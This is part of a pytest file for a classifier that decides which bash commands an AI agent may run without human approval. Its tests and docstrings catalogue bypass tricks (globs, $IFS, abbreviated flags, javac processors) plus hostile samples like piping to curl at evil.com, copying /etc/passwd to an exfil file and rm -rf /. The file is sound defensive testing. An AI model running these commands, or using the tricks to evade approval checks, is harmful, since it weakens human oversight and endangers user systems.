        Scanning for a bare `#` or `<` would have cost the ordinary reads that
        carry one as DATA, which is most of the ones that carry one at all.
        """
        # `#` inside quotes, and `#` mid-word, are not comments to bash.
        assert is_read_only_bash("grep '#include' file") is True
        assert is_read_only_bash("git log --grep '#123'") is True
        assert is_read_only_bash("git log --grep=#123") is True
        assert is_read_only_bash("echo a#b") is True
        assert is_read_only_bash("grep \\# file") is True
        # The plain reads are untouched.
        assert is_read_only_bash("git status") is True
        assert is_read_only_bash("git branch --list 'feat/*'") is True
        assert is_read_only_bash("cat f | sort -u") is True

    def test_the_two_costs_of_refusing_the_class_are_asserted_not_assumed(self):
        """The price of the fail-safe direction, pinned so it cannot drift silently.

        Neither of these is a bypass and neither is blocked — both fall through to
        the human approval prompt. They are asserted so the auto-approve-rate loss
        is visible in the suite rather than discovered in use, and so that anyone
        who later narrows the refusal has a test telling them what they are
        buying back.
        """
        # Cost 1, the larger one: an ordinary trailing comment is refused. Bash
        # would simply delete it, so these ARE reads — but the classifier cannot
        # tell this `#` from the forged-flag `#` above without reproducing the
        # deletion, which is what reopened the bypass. Agent-emitted bash carries
        # a trailing comment often, so this is a real everyday loss.
        assert is_read_only_bash("git status # note") is False
        assert is_read_only_bash("ls -la # list files") is False
        assert is_read_only_bash("grep -rn foo src # find it") is False
        assert "comment" in unsafe_bash_reason("git status # note")
        # Cost 2: an unquoted input redirect is refused even where it is
        # harmless, because the danger is the token-list divergence rather than
        # the direction of the data.
        assert is_read_only_bash("wc -l < file") is False
        assert is_read_only_bash("grep pattern < file") is False
        assert "redirect" in unsafe_bash_reason("wc -l < file")
        # Quoting is the escape hatch for both: a user who means the `#` as data
        # keeps their auto-approval.
        assert is_read_only_bash("grep '#note' file") is True

    def test_a_positional_or_special_parameter_hides_the_real_argument(self):
        """`$@` and `$1` are expansions whose NAME is not an identifier.

        The `$`-led class was keyed on `$` followed by a quote, a brace or an
        identifier character, so the positional and special parameters were the
        one sibling left open on the identical path — and the sharpest, because in
        a `bash -c` string with no positional arguments `$@` and `$*` expand to
        NOTHING: `git remote $@set-url origin …` reaches this module as the token
        `$@set-url`, matching no subcommand, and reaches git as `set-url`.
        """
        assert is_read_only_bash("git remote $@set-url origin https://evil") is False
        assert is_read_only_bash("git remote $*set-url origin https://evil") is False
        assert is_read_only_bash("git remote $1set-url origin https://evil") is False
        assert is_read_only_bash("git diff $1--output=/tmp/pwned") is False
        assert is_read_only_bash("git diff $@--output=/tmp/pwned") is False
        assert is_read_only_bash("git branch $@-D release") is False
        assert is_read_only_bash("cat f | sort $@-o /tmp/pwned") is False
        # The other special parameters are the same divergence.
        for param in ("$?", "$$", "$!", "$#", "$-", "$0"):
            assert is_read_only_bash(f"git diff {param}--output=/tmp/pwned") is False

    def test_an_expansion_is_refused_only_where_a_table_decides_the_argument(self):
        """A verb with no table has no decision an unexpanded word could subvert.

        `cat $HOME/.bashrc` was always going to classify read-only whatever `$HOME`
        holds — `cat` has no write flag, no subcommand and no operand rule here —
        so refusing the expansion bought nothing and took the most ordinary read
        off the auto-approve path. The refusal is scoped to the verbs whose
        arguments this module actually reads.
        """
        # No table: the expansion cannot change the answer, so it still reads.
        assert is_read_only_bash("cat $HOME/.bashrc") is True
        assert is_read_only_bash("ls $PWD") is True
        assert is_read_only_bash("head -20 $LOG") is True
        assert is_read_only_bash("grep -rn TODO $DIR") is True
        assert is_read_only_bash("wc -l ${F}") is True
        assert is_read_only_bash("cat file.{js,ts}") is True
        assert is_read_only_bash("readlink -f $X") is True
        # A table decides the argument: the expansion is still refused.
        assert is_read_only_bash("git diff $FLAG") is False
        assert is_read_only_bash("cat f | sort $FLAG /tmp/pwned") is False
        assert is_read_only_bash("uniq $ARGS") is False
        assert is_read_only_bash("tree ${FLAG}") is False
        assert is_read_only_bash("file ${FLAG} -m /tmp/magic.src") is False

    def test_git_tag_annotation_listing_is_not_a_ref_creation(self):
        """`git tag -n` prints annotation lines — a listing with no `branch` twin.

        List mode was keyed on the letter `l` for both subcommands, so `git tag -n
        'v1.*'` read its pattern as a ref to create and a common inspection lost
        its auto-approval. The letters are tracked per subcommand because the two
        do not agree, and a letter may only be added where it is not also a write
        flag for that subcommand.
        """
        assert is_read_only_bash("git tag -n") is True
        assert is_read_only_bash("git tag -n 'v1.*'") is True
        assert is_read_only_bash("git tag -n5 'v1.*'") is True
        assert is_read_only_bash("git tag -ln") is True
        assert is_read_only_bash("git tag -n -l 'v1.*'") is True
        # `git branch` has no `-n` listing, so the letter must not leak across.
        assert is_read_only_bash("git branch -n newbranch") is False
        # And the write flags of `git tag` are untouched by the listing letters.
        assert is_read_only_bash("git tag -n -d v1.0.0") is False
        assert is_read_only_bash("git tag -nm msg v1.0.0") is False

    def test_a_version_probe_entry_matches_exactly(self):
        """`javac` prints its version and then compiles whatever else it was given.

        `"javac -version"` is an allowlist literal matched as a PREFIX, so the
        operands after it were vouched for too — and an annotation processor is
        ordinary compiled Java on a caller-supplied path, i.e. arbitrary code
        execution under an auto-approval. Reported on #1532 by the reviewers and
        independently in #5038, whose table names it as the sharpest shape.

        All five probes require the exact spelling, not only `javac`: whether an
        interpreter ignores a trailing operand is a property of the installed
        release, and JDK single-file source mode already moved that answer once.
        """
        assert (
            is_read_only_bash("javac -version -processorpath evil.jar -processor Evil P.java")
            is False
        )
        assert is_read_only_bash("java -version Payload.java") is False
        assert is_read_only_bash("python3 --version payload.py") is False
        assert is_read_only_bash("python --version payload.py") is False
        assert is_read_only_bash("node --version payload.js") is False
        # The probes themselves, including the canonical `java` spelling: java
        # prints its version to STDERR, so `2>&1` must not read as an operand.
        assert is_read_only_bash("javac -version") is True
        assert is_read_only_bash("java -version") is True
        assert is_read_only_bash("java -version 2>&1") is True
        assert is_read_only_bash("java -version 2>/dev/null") is True
        assert is_read_only_bash("python3 --version") is True
        assert is_read_only_bash("node --version") is True

    def test_a_system_state_setter_hides_under_a_listing_verb(self):
        """`hostname` and `date` are on the allowlist for their bare listing form.

        Each also carries a setter under the same verb, and the prefix match
        vouched for it: `hostname evil-host` renames the host and `date 08221200`
        sets the clock, both with no flag at all. Reported in #5038.

        The two need different operand predicates rather than one shared rule —
        every `hostname` read form is flag-only, while `date`'s one legitimate
        operand is a `+FORMAT` string.
        """
        # Bare operands.
        assert is_read_only_bash("hostname evil-host") is False
        assert is_read_only_bash("date 08221200") is False
        assert is_read_only_bash("date -- 08221200") is False
        # Setter flags, including the attached spellings.
        assert is_read_only_bash("hostname -F /tmp/name") is False
        assert is_read_only_bash("hostname --file=/tmp/name") is False
        assert is_read_only_bash("hostname -b") is False
        assert is_read_only_bash("date -s '2020-01-01'") is False
        assert is_read_only_bash("date --set='2020-01-01'") is False
        # The listing and inspection forms all still auto-approve. `date -Iseconds`
        # is the case a short-option CLUSTER scan gets wrong: its attached value
        # contains an `s`, which is not the `-s` that sets the clock.
        assert is_read_only_bash("date") is True
        assert is_read_only_bash("date -u") is True
        assert is_read_only_bash("date -Iseconds") is True
        assert is_read_only_bash("date +%Y-%m-%d") is True
        assert is_read_only_bash("date -d yesterday") is True
        assert is_read_only_bash("date --date=yesterday") is True
        assert is_read_only_bash("date -r /tmp/f") is True
        assert is_read_only_bash("hostname") is True
        assert is_read_only_bash("hostname -f") is True
        assert is_read_only_bash("hostname -I") is True
        # `-F` sets from a file, `-f` prints the FQDN: the case carries the meaning.
        assert is_read_only_bash("hostname --fqdn") is True

    def test_sort_writes_into_a_caller_named_temporary_directory(self):
        """`sort -T DIR` writes its temporaries into a directory the caller chose.

        A write to a caller-named path, one step removed from `-o` — the same
        shape as `tree -R`, and missed for the same reason: the flag does not
        name the file. Reported in #5038.
        """
        assert is_read_only_bash("cat f | sort -T /tmp/evildir") is False
        assert is_read_only_bash("cat f | sort -T/tmp/evildir") is False
        assert is_read_only_bash("cat f | sort --temporary-directory=/tmp/evildir") is False
        # The ordinary sort options are untouched.
        assert is_read_only_bash("cat f | sort -u") is True
        assert is_read_only_bash("cat f | sort -k2,2n") is True
        assert is_read_only_bash("cat f | sort -t,") is True

    def test_an_extglob_token_is_refused_because_fnmatch_cannot_rule_on_it(self):
        """Extglob synthesizes an option token exactly as an ordinary glob does.

        `git diff @(--output=pwned)` matches a file of that name and git writes
        it. It needs its own verdict because `fnmatch` — the test that makes the
        plain-glob case precise — does not implement extglob: it reads `@(` as two
        literal characters, so the pattern that reaches the flag looks inert.
        Nothing can be proven about the token, so a guarded verb refuses it.
        Reported in #5038, which measured the expansion.
        """
        for op in ("@", "!", "+", "?", "*"):
            assert is_read_only_bash(f"git diff {op}(--output=pwned)") is False
        assert is_read_only_bash("cat f | sort @(-o) victim") is False
        assert is_read_only_bash("git remote @(set-url) origin https://evil") is False
        # A parenthesis with no extglob operator in front of it is not this class,
        # and an unguarded verb is unaffected either way.
        assert is_read_only_bash("grep -n 'f(x)' file") is True
        assert is_read_only_bash("ls *.py") is True

    def test_a_system_setter_is_not_reachable_through_a_terminator_or_expansion(self):
        """The operand rule is the decision for `hostname`/`date`, so it needs both guards.

        Two shapes, both found reviewing this change against the reviewer
        contracts before pushing it. `--` ends the options for these verbs too,
        so `hostname -- -evil` names the host `-evil` while a leading-dash test
        read it as one more option. And because their rule is an OPERAND rule
        rather than a flag table, an unexpanded word IS the decision: `hostname
        $EVIL` renames the host under a spelling this module read as harmless.
        """
        # The option terminator.
        assert is_read_only_bash("hostname -- -evil") is False
        assert is_read_only_bash("hostname -- evil") is False
        assert is_read_only_bash("date -- 08221200") is False
        # An expansion or a glob standing where the operand is read.
        assert is_read_only_bash("hostname $EVIL") is False
        assert is_read_only_bash("hostname ${EVIL}") is False
        assert is_read_only_bash("hostname evil{a,b}") is False
        assert is_read_only_bash("date $ARGS") is False
        assert is_read_only_bash("hostname *.txt") is False
        # The listing forms are flag-only, so they carry no operand to expand.
        assert is_read_only_bash("hostname") is True
        assert is_read_only_bash("hostname -f") is True
        assert is_read_only_bash("date -u") is True

    def test_a_long_option_takes_its_value_from_the_following_word(self):
        """Long and short options disagree about consuming the next word.

        A long option takes a separate value unless it is attached with `=`, so
        `date --date yesterday` is an ordinary read; a short option takes one only
        when the token is the bare flag, because `-Iseconds` carries its own.
        Collapsing the two into one length test denied the long forms.
        """
        assert is_read_only_bash("date --date yesterday") is True
        assert is_read_only_bash("date --reference /tmp/f") is True
        assert is_read_only_bash("date --file /tmp/dates") is True
        assert is_read_only_bash("date --date=yesterday") is True
        assert is_read_only_bash("date -d yesterday") is True
        assert is_read_only_bash("date -r /tmp/f") is True
        assert is_read_only_bash("date -Iseconds") is True
        # A value-taking flag does not license a SECOND operand.
        assert is_read_only_bash("date -d yesterday 08221200") is False
        assert is_read_only_bash("date --date yesterday 08221200") is False

    def test_an_option_looking_glob_is_refused_on_the_metacharacter_alone(self):
        """`fnmatch` cannot see a short-option CLUSTER, so the flag NAME needs its own rule.

        `sort -u? victim` slipped every other test: no decided word is three
        characters long, the metacharacter is not first so the leading-character
        rule did not fire, and bash resolved `-u?` against a file named `-uo` —
        which `_matched_flag` would have rejected had it ever seen the token.

        Refusing it costs nothing, because what is inspected is the flag NAME: a
        glob in a flag's VALUE is split off first.
        """
        assert is_read_only_bash("cat f | sort -u? victim") is False
        assert is_read_only_bash("cat f | sort -[u]o victim") is False
        assert is_read_only_bash("cat f | sort -u* victim") is False
        assert is_read_only_bash("git diff --outp?t=/tmp/pwned") is False
        assert is_read_only_bash("git branch -D? release") is False
        # A glob in a flag's VALUE, and in an operand, are the ordinary cases.
        assert is_read_only_bash("git log --grep=[abc]") is True
        assert is_read_only_bash("ls *.py") is True
        assert is_read_only_bash("git diff -- src/*") is True

    def test_a_glob_that_reaches_an_abbreviated_long_option_is_refused(self):
        """`_matched_flag` resolves an abbreviation, so the glob test has to as well.

        Testing a glob head against the FULL spellings only left
        `git diff ??out=victim` auto-approved: `fnmatch("--output", "??out")` is
        False on the length alone, `git diff`'s table carries no short flag so the
        cluster arm does not fire either, and bash resolves `??out` against a file
        named `--out` which git then reads as `--output`. The full-length spelling
        `??output` was already refused, which is what made the gap look closed.
        """
        assert is_read_only_bash("git diff ??out=victim") is False
        assert is_read_only_bash("git log ??out=victim") is False
        assert is_read_only_bash("git show ??outp=victim") is False
        assert is_read_only_bash("git diff ??ext-dif") is False
        assert is_read_only_bash("git cat-file ??filt=HEAD:f") is False
        # The full spellings, and the un-globbed abbreviation, were already refused.
        assert is_read_only_bash("git diff ??output=victim") is False
        assert is_read_only_bash("git diff --out=victim") is False
        assert is_read_only_bash("cat f | sort ??out=victim") is False
        # A pattern that reaches no decided word — full or abbreviated — still reads.
        assert is_read_only_bash("git diff *.py") is True
        assert is_read_only_bash("git diff -- src/*") is True
        assert is_read_only_bash("git log --grep=[abc]") is True
        assert is_read_only_bash("git branch --list 'feat/*'") is True
        assert is_read_only_bash("ls *.py") is True

    def test_a_pipe_target_must_be_the_filter_it_matched(self):
        """`_READ_ONLY_PIPE_RE` ends its filter name at a `\\b`, and `$` satisfies that.

        `cat f | sort$IFS-o victim` matched the allowlist entry `sort` while bash
        split `$IFS` into whitespace and ran `sort -o victim`. Nothing downstream
        recovered it either: `_side_effect_reason` reads the verb as `sort$ifs-o`,
        finds no table under that name, and returns "".

        The leading segment of a pipeline was never exposed, because its allowlist
        test pins the boundary to a literal space. This makes the pipe allowlist
        say the same thing: the first argv word, exactly.
        """
        assert is_read_only_bash("cat f | sort$IFS-o victim") is False
        assert is_read_only_bash("cat f | sort${IFS}-o victim") is False
        assert is_read_only_bash("cat f | uniq$IFS/tmp/in$IFS/tmp/pwned") is False
        assert is_read_only_bash("cat f | head$IFS-c1000") is False
        # The honest filters, which are the whole point of the pipe allowlist.
        assert is_read_only_bash("cat f | sort") is True
        assert is_read_only_bash("cat f | sort -u") is True
        assert is_read_only_bash("cat f | uniq -c") is True
        assert is_read_only_bash("cat f | head -5") is True
        assert is_read_only_bash("git log --oneline | grep fix | wc -l") is True

    def test_a_short_setter_is_found_anywhere_in_a_cluster(self):
        """`date -us2026-08-23` is `-u` plus `-s 2026-08-23`, and it sets the clock.

        A setter test anchored at the token's first character never saw it. The
        cluster is walked instead, stopping at the first letter that consumes the
        rest of the token — which is what keeps `date -Iseconds` a read, since the
        `s` there belongs to `-I`'s value rather than being a flag.
        """
        assert is_read_only_bash("date -us2026-08-23") is False
        assert is_read_only_bash("date -Rs2026-08-23") is False
        assert is_read_only_bash("date -s2026-08-23") is False
        assert is_read_only_bash("hostname -bF /tmp/name") is False
        # The value-carrying and no-value read letters, and the case distinction.
        assert is_read_only_bash("date -Iseconds") is True
        assert is_read_only_bash("date -u") is True
        assert is_read_only_bash("date -R") is True
        assert is_read_only_bash("date -d yesterday") is True
        assert is_read_only_bash("date -r /tmp/f") is True
        assert is_read_only_bash("hostname -s") is True
        assert is_read_only_bash("hostname -f") is True
        assert is_read_only_bash("hostname -I") is True

    def test_a_required_option_value_does_not_enable_git_list_mode(self):
        """git takes a required flag's value from the following word, so it is not an option.

        `git branch --format -l newbranch` hands `-l` to `--format` and git never
        sees a list flag — while scanning every token read that `-l` as one, and
        the bare operand it then licensed created the branch. The operand walk
        already tracked this; list mode now tracks it over the same tokens.
        """
        assert is_read_only_bash("git branch --format -l newbranch") is False
        assert is_read_only_bash("git branch --sort -l newbranch") is False
        assert is_read_only_bash("git tag --format -l newtag") is False
        # `--points-at` is in BOTH sets by design: it consumes its value AND
        # selects. So here list mode is genuinely on, `-l` is its value, and
        # `newbranch` is a pattern rather than a ref to create — git lists.
        # Excluding consumed values must not turn a real selector off.
        assert is_read_only_bash("git branch --points-at -l newbranch") is True
        assert is_read_only_bash("git branch --points-at HEAD newbranch") is True
        # A real selector, and an ATTACHED value that consumes nothing.
        assert is_read_only_bash("git branch --format %(refname) --list") is True
        assert is_read_only_bash("git branch --format=%(refname) --list") is True
        assert is_read_only_bash("git branch --sort=refname --list") is True
        assert is_read_only_bash("git branch --list newbranch") is True
        assert is_read_only_bash("git tag -l 'v1.*'") is True

    def test_an_abbreviated_value_flag_still_consumes_the_following_word(self):
        """git resolves `--form` to `--format`, so it eats the next word.

        Reading `--form` as an ordinary option left the `-l` in
        `git branch --form -l newbranch` looking like a list flag, and the bare
        operand that licensed created the branch. This is the fourth site on this
        guard to need the abbreviation axis — after `_matched_flag`,
        `_system_set_flag` and `_glob_reaches` — hence a named helper.
        """
        assert is_read_only_bash("git branch --form -l newbranch") is False
        assert is_read_only_bash("git branch --forma -l newbranch") is False
        assert is_read_only_bash("git branch --so -l newbranch") is False
        assert is_read_only_bash("git tag --form -l newtag") is False
        # The full spellings, and an ATTACHED value which consumes nothing.
        assert is_read_only_bash("git branch --format %(refname) --list") is True
        assert is_read_only_bash("git branch --format=%(refname) --list") is True
        assert is_read_only_bash("git branch --sort=refname --list") is True
        assert is_read_only_bash("git branch --points-at HEAD newbranch") is True

    def test_a_glob_in_the_remote_subcommand_position_is_refused(self):
        """`nullglob` makes an unmatched pattern VANISH, which shifts the subcommand.

        With `nullglob` exported, `git remote nomatch* set-url origin …` loses
        `nomatch*` entirely and git receives `set-url`, while the subcommand loop
        broke on the pattern and never looked further.

        `_glob_hides_word` cannot cover this: it asks whether a pattern can expand
        INTO a decided word, and `nomatch*` cannot — the mutation comes from the
        token disappearing, not from what it becomes. Removing this check on the
        grounds that the general test subsumed it is what opened the hole.
        """
        assert is_read_only_bash("git remote nomatch* set-url origin https://evil") is False
        assert is_read_only_bash("git remote nomatch? add evil https://evil") is False
        assert is_read_only_bash("git remote no[m]atch remove origin") is False
        assert is_read_only_bash("git remote -v nomatch* set-url origin https://evil") is False
        # The listing forms, and the read subcommand, still auto-approve.
        assert is_read_only_bash("git remote") is True
        assert is_read_only_bash("git remote -v") is True
        assert is_read_only_bash("git remote get-url origin") is True

    def test_a_glob_that_changes_the_argument_count_is_refused(self):
        """A glob can decide by COUNT rather than by what it becomes, in both directions.

        Several matches become several WORDS: with `in1` and `in2` present,
        `uniq in*` runs `uniq in1 in2`, whose second operand is the OUTPUT file —
        so one pattern passed a segment that truncates a file. And no match under
        `nullglob` makes the word VANISH: `git branch --format nomatch* --list
        newbranch` loses the format's value, `--format` eats `--list` instead, and
        `newbranch` stops being a pattern.

        Neither needs the pattern to resemble a word this module decides on, so
        `_glob_hides_word` could not rule on either. It is asked only where the
        count or the position carries the verdict — a `uniq` operand and a required
        git option's value — which is what keeps ordinary globbing a read.
        """
        assert is_read_only_bash("cat f | uniq in*") is False
        assert is_read_only_bash("cat f | uniq in* out") is False
        assert is_read_only_bash("cat f | uniq @(in)") is False
        assert is_read_only_bash("cat f | uniq -- in*") is False
        assert is_read_only_bash("git branch --format nomatch* --list newbranch") is False
        assert is_read_only_bash("git branch --sort nomatch* --list newbranch") is False
        assert is_read_only_bash("git tag --format nomatch* -l newtag") is False
        # An operand whose meaning does NOT depend on its position is unaffected,
        # which is the whole reason this is a separate question.
        assert is_read_only_bash("cat f | uniq -c") is True
        assert is_read_only_bash("cat f | uniq /tmp/in") is True
        assert is_read_only_bash("git branch --list 'feat/*'") is True
        assert is_read_only_bash("git tag -l 'v1.*'") is True
        assert is_read_only_bash("git branch --format %(refname) --list") is True
        assert is_read_only_bash("git branch --format=%(refname) --list") is True
        assert is_read_only_bash("git diff *.py") is True
        assert is_read_only_bash("ls *.py") is True
        assert is_read_only_bash("grep -rn TODO src/*") is True
        assert is_read_only_bash("cat *.log") is True

    def test_a_negated_list_flag_cancels_list_mode(self):
        """git auto-generates `--no-<opt>` for a boolean, so `--list` has a negation.

        `git branch --list --no-list newbranch` CREATES the branch, and reading the
        `--list` alone as "this is a listing" passed the bare operand off as a
        pattern.

        The table behind this was measured against git rather than inferred,
        because the neighbouring `--no-` spellings do not behave the same way:
        `--no-contains` and `--no-merged` are real list FILTERS, not negations, and
        `git tag` has no `--no-list` at all — so treating any `--no-*` as
        cancelling would have denied ordinary reads.
        """
        assert is_read_only_bash("git branch --list --no-list newbranch") is False
        assert is_read_only_bash("git branch --list --no-lis newbranch") is False
        assert is_read_only_bash("git branch -l --no-list newbranch") is False
        assert is_read_only_bash("git branch --no-list newbranch") is False
        # Measured: git errors on these rather than creating a ref, so the listing
        # filters must keep reading.
        assert is_read_only_bash("git branch --no-contains HEAD") is True
        assert is_read_only_bash("git branch --no-merged") is True
        assert is_read_only_bash("git branch --contains HEAD --no-contains newbranch") is True
        assert is_read_only_bash("git branch --list") is True
        assert is_read_only_bash("git branch --list 'feat/*'") is True

    def test_a_glob_pattern_is_matched_case_insensitively(self):
        """`nocaseglob` decouples the pattern's case from the filename's.

        With it set, `git diff ??OUT=victim` expands to `--out=victim` and git
        writes the file, while a case-sensitive test saw a pattern matching
        nothing. Measured: `bash -O nocaseglob -c 'echo git diff ??OUT=victim'`
        prints `git diff --out=victim`; plain `bash -c` does not.

        The case sensitivity this module DOES rely on is elsewhere and unaffected —
        `file -C` still differs from `file -c`, because that reads a literal token
        rather than asking what a pattern could become.
        """
        assert is_read_only_bash("git diff ??OUT=victim") is False
        assert is_read_only_bash("git log ??OUTPUT=victim") is False
        assert is_read_only_bash("git show ??Out=victim") is False
        assert is_read_only_bash("cat f | sort ??OUT=victim") is False
        assert is_read_only_bash("git remote S?T-URL origin https://evil") is False
        # The literal-token case distinction is untouched.
        assert is_read_only_bash("file -C -m /tmp/magic.src") is False
        assert is_read_only_bash("file -c") is True
        # And a pattern that reaches no decided word in either case still reads.
        assert is_read_only_bash("git diff *.PY") is True
        assert is_read_only_bash("ls *.PY") is True

    def test_an_abbreviated_long_setter_still_matches(self):
        """GNU resolves an unambiguous abbreviation, so a plain prefix test missed it.

        `date --se=2026-08-23` reaches `--set` and the clock moves. Abbreviation is
        a separate axis from the cluster scan this function exists to avoid, and
        `_matched_flag` already accepts it for every other table.
        """
        assert is_read_only_bash("date --se=2026-08-23") is False
        assert is_read_only_bash("date --s=2026-08-23") is False
        assert is_read_only_bash("date --set=2026-08-23") is False
        assert is_read_only_bash("hostname --fi=/tmp/name") is False
        assert is_read_only_bash("hostname --file=/tmp/name") is False
        # An abbreviation of a READ option is not a setter.
        assert is_read_only_bash("date --dat=yesterday") is True
        assert is_read_only_bash("date --utc") is True
        assert is_read_only_bash("hostname --fqdn") is True

    def test_a_signing_key_does_not_select_git_tag_list_mode(self):
        """`git tag -u <keyid>` makes the tag annotated and signed, so it creates a ref.

        Two defects met here. `-u`/`--local-user` was in the `branch` write list
        (set-upstream) and missing from `tag`. And the list-letter scan asked
        whether ANY character of the cluster was a list letter, which read an
        attached VALUE as part of the cluster — the `l` in `-ulin@kiro.co` selected
        list mode, and the bare operand it then licensed created a signed tag.
        Every character must now be a list letter or a digit.
        """
        assert is_read_only_bash("git tag -ulin@kiro.co release") is False
        assert is_read_only_bash("git tag -u lin@kiro.co release") is False
        assert is_read_only_bash("git tag --local-user=lin release") is False
        assert is_read_only_bash("git tag -u lin") is False
        # The listing clusters still list: a list letter, or one plus `-n`'s count.
        assert is_read_only_bash("git tag -l 'v1.*'") is True
        assert is_read_only_bash("git tag -n 'v1.*'") is True
        assert is_read_only_bash("git tag -n5 'v1.*'") is True
        assert is_read_only_bash("git tag -ln") is True
        assert is_read_only_bash("git tag -ln5") is True
        assert is_read_only_bash("git branch --list 'feat/*'") is True

    def test_compound_read_commands(self):
        assert is_read_only_bash("git status && git log --oneline -3") is True
        assert is_read_only_bash("ls -la; echo done") is True

    def test_redirections_rejected(self):
        assert is_read_only_bash("echo payload > /etc/file") is False
        assert is_read_only_bash("cat /etc/passwd > /tmp/exfil.txt") is False
        # Redirect to a real file stays unsafe even when it sits next to a
        # /dev/null sink — the scrub must not strip the real-file redirect.
        assert is_read_only_bash("grep x f 2>/dev/null > /tmp/out.txt") is False
        assert is_read_only_bash("echo hi >> /tmp/append.txt") is False

    def test_devnull_redirects_allowed(self):
        """Discard-only redirect idioms are read-only despite '>'/'&'."""
        assert is_read_only_bash("head -5 file.txt 2>/dev/null") is True
        assert is_read_only_bash("grep -r 'pattern' src/ 2>/dev/null") is True
        assert is_read_only_bash("ls /nonexistent >/dev/null") is True
        assert is_read_only_bash("cat file &>/dev/null") is True
        assert is_read_only_bash("wc -l /tmp/x 2>>/dev/null") is True
        assert is_read_only_bash("ls -la 2>&1") is True
        # Compound + pipe chains with a /dev/null sink stay read-only.
        assert is_read_only_bash("grep -r foo . 2>/dev/null | head -20") is True
        assert is_read_only_bash("ls /a 2>/dev/null; grep -r foo /b 2>/dev/null") is True

    def test_devnull_does_not_unlock_write_commands(self):
        """The /dev/null exemption must not allowlist a write/exec command."""
        assert is_read_only_bash("rm -rf /tmp/foo 2>/dev/null") is False
        assert is_read_only_bash("python script.py 2>/dev/null") is False
        assert is_read_only_bash("cat /etc/passwd > /tmp/exfil 2>/dev/null") is False

    def test_devnull_prefix_is_not_a_real_file_sink(self):
        r"""`/dev/null` must match the literal device, not a path prefix.

        Without the `(?![\w./-])` guard the scrub would strip the redirect in
        `>/dev/nullx` (a write to file `nullx`) and misclassify it read-only.
        """
        assert is_read_only_bash("echo x >/dev/nullx") is False
        assert is_read_only_bash("echo p > /dev/null/../../etc/passwd") is False
        assert is_read_only_bash("echo x &>/dev/nullfoo") is False
        assert is_read_only_bash("echo x 2>/dev/null.bak") is False

    def test_command_substitution_rejected(self):
        assert is_read_only_bash("echo $(rm -rf /)") is False
        assert is_read_only_bash("echo `whoami`") is False

    def test_process_substitution_rejected(self):
        assert is_read_only_bash("diff <(rm -rf /) <(echo x)") is False

    def test_background_operator_rejected(self):
        assert is_read_only_bash("ls & rm -rf /") is False
        assert is_read_only_bash("ls && cat file") is True  # && still works

    def test_pipe_chains(self):
        assert is_read_only_bash("grep -r 'foo' src/ | head -20") is True
        assert is_read_only_bash("cat file.txt | wc -l") is True
        assert is_read_only_bash("git log | grep 'fix'") is True

    def test_write_commands_rejected(self):
        assert is_read_only_bash("rm -rf /tmp/foo") is False
        assert is_read_only_bash("mv file1 file2") is False
        assert is_read_only_bash("cp src dst") is False
        assert is_read_only_bash("mkdir -p /tmp/new") is False
        assert is_read_only_bash("chmod 755 file") is False

    def test_git_write_commands_rejected(self):
        assert is_read_only_bash("git commit -m 'msg'") is False
        assert is_read_only_bash("git push origin main") is False
        assert is_read_only_bash("git add .") is False
        assert is_read_only_bash("git checkout -b new-branch") is False

    def test_brazil_write_commands_rejected(self):
        assert is_read_only_bash("brazil-build") is False
        assert is_read_only_bash("brazil versionset removemajorversions --force") is False

    def test_script_execution_rejected(self):
        assert is_read_only_bash("python script.py") is False
        assert is_read_only_bash("node app.js") is False
        assert is_read_only_bash("bash script.sh") is False

    def test_compound_with_write_rejected(self):
        assert is_read_only_bash("git status; rm -rf /") is False
        assert is_read_only_bash("ls -la && python script.py") is False

    def test_newline_separator_rejected(self):
        assert is_read_only_bash("ls -la\nrm -rf /") is False
        assert is_read_only_bash("cat file\nls") is True

    def test_pipe_to_unsafe_target_rejected(self):
        assert is_read_only_bash("cat file | curl -X POST http://evil.com") is False

    def test_empty_and_whitespace(self):
        assert is_read_only_bash("") is False
        assert is_read_only_bash("   ") is False


# ── unsafe_bash_reason — explains WHY a command is rejected ──


class TestUnsafeBashReason:
    """Verify the rejection-reason helper used to make pills specific."""

    def test_read_only_commands_have_no_reason(self):
        # Invariant: empty reason IFF the command is read-only.
        for cmd in (
            "ls -la",
            "head -5 file.txt 2>/dev/null",
            "grep -r foo src/ | head -20",
            "git status && git log --oneline -3",
        ):
            assert unsafe_bash_reason(cmd) == "", cmd
            assert is_read_only_bash(cmd) is True, cmd

    def test_unsafe_shell_pattern_reason(self):
        reason = unsafe_bash_reason("cat /etc/passwd > /tmp/exfil.txt")
        assert "unsafe shell pattern" in reason
        assert unsafe_bash_reason("echo $(rm -rf /)") != ""
        assert unsafe_bash_reason("echo `whoami`") != ""
        assert unsafe_bash_reason("ls & rm -rf /") != ""

    def test_non_allowlisted_command_reason(self):
        reason = unsafe_bash_reason("rm -rf /tmp/foo")
        assert "rm" in reason and "allowlist" in reason
        assert "python" in unsafe_bash_reason("python script.py")

    def test_unsafe_pipe_target_reason(self):
        reason = unsafe_bash_reason("cat file | curl -X POST http://evil.com")
        assert "curl" in reason and "read-only filter" in reason

    def test_empty_command_reason(self):
        assert unsafe_bash_reason("") == "empty command"
        assert unsafe_bash_reason("   ") == "empty command"

    def test_reason_invariant_matches_classifier(self):
        """unsafe_bash_reason is non-empty exactly when is_read_only_bash is False."""
        samples = [
            "ls -la",
            "wc -l /tmp/x 2>/dev/null",
            "grep -r foo src/ | head",
            "echo payload > /etc/file",
            "echo $(rm -rf /)",
            "ls & rm -rf /",
            "rm -rf /tmp/foo",
            "python script.py",
            "cat file | curl http://evil.com",
            "",
            "   ",
            "git push origin main",
        ]
        for cmd in samples:
            has_reason = unsafe_bash_reason(cmd) != ""
            assert has_reason == (not is_read_only_bash(cmd)), cmd


# ── _extract_bash_command ──


class TestExtractBashCommand:
    """Verify JSON tool_input parsing."""

    def test_json_with_command_field(self):
        import json

        tool_input = json.dumps({"command": "find . -name '*.py'"})
        assert _extract_bash_command(tool_input) == "find . -name '*.py'"

    def test_json_with_indent(self):
        import json

        tool_input = json.dumps({"command": "ls -la", "__tool_use_purpose": "list files"}, indent=2)
        assert _extract_bash_command(tool_input) == "ls -la"

    def test_json_missing_command(self):
        import json

        tool_input = json.dumps({"other": "value"})
        assert _extract_bash_command(tool_input) == ""

    def test_raw_string_fallback(self):
        assert _extract_bash_command("ls -la") == "ls -la"

    def test_empty(self):
        assert _extract_bash_command("") == ""


# ── Approval endpoint: trust_reads action ──


class TestTrustReadsApproval:
    @pytest.mark.asyncio
    async def test_trust_reads_sets_flag(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
